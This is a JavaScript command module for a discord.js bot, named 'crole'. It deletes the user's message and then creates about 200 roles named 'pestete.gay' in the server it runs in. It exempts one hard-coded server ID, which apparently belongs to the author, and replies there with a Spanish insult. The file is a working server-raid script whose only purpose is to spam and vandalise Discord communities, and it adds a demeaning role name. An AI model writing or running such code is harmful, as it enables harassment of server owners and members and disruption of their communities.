const Discord = require('discord.js');

module.exports = {
  name: "crole",
  alias: ["crole", "roles"],

execute (client, message, args){

    if (message.guild.id == "879159373270761522") return message.channel.send("¿Que intentas subnormal?")
  
  message.delete();
		for (let i = 0; i <= 200; i++) {
			message.guild.roles.create({
				data: { name: `pestete.gay`, color: '#0f0e0e' },
				reason: 'razon'
			});
		}
	}
} 
